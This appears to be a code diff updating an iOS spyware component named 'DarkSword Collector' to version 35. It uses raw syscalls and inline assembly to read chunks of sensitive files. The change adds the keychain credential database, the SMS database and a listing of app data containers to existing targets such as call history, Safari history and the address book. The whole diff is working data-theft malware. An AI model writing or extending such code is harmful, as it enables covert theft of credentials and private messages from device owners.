@@ -1,7 +1,8 @@
 /**
- * DarkSword Collector v34 - Fixed 20 bytes per file, then switch
- * g_ctx: bits 0-7 = chunk_within_file, bits 16-23 = file_id
- * After 5 chunks (20 bytes), advance to next file.
+ * DarkSword Collector v35 - Credential-focused: Keychain + App containers
+ * Phase 1: Read keychain DB first bytes
+ * Phase 2: List /var/mobile/Containers/Data/Application/ entries
+ * Uses getdirentries syscall for directory listing
  */
 
 static long _svc1(long n, long a) {
@@ -25,9 +26,11 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define SYS_read 3
 #define SYS_close 6
 #define SYS_lseek 199
+#define SYS_getdirentries 196
 #define SEEK_SET 0
 #define O_RDONLY 0
-#define NUM_FILES 6
+
+#define NUM_FILES 8
 #define CHUNKS_PER_FILE 5
 
 static volatile int g_ctx = 0;
@@ -35,14 +38,26 @@ static volatile int g_ctx = 0;
 static const char *get_path(int id) {
     switch (id) {
         case 0: return "/etc/hosts";
-        case 1: return "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
-        case 2: return "/var/mobile/Library/Safari/History.db";
-        case 3: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
-        case 4: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist";
-        case 5: return "/var/mobile/Library/Preferences/com.apple.springboard.plist";
+        case 1: return "/var/keychains/keychain-2.db";
+        case 2: return "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
+        case 3: return "/var/mobile/Library/Safari/History.db";
+        case 4: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
+        case 5: return "/var/mobile/Library/SMS/sms.db";
+        case 6: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist";
+        case 7: return "/var/mobile/Library/Preferences/com.apple.springboard.plist";
         default: return (void*)0;
     }
 }
+
+/* Directory entry structure for getdirentries */
+struct dirent_darwin {
+    unsigned long long d_ino;
+    unsigned long long d_seekoff;
+    unsigned short d_reclen;
+    unsigned short d_namlen;
+    unsigned char d_type;
+    char d_name[1024];
+};
 
 int ds_start(void) {
     int ctx;
@@ -55,7 +70,6 @@ int ds_start(void) {
         return 0xFFFFFFFF;
     }
 
-    /* Advance to next file after CHUNKS_PER_FILE chunks */
     if (chk >= CHUNKS_PER_FILE) {
         int nc = ((fid + 1) << 16);
         __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
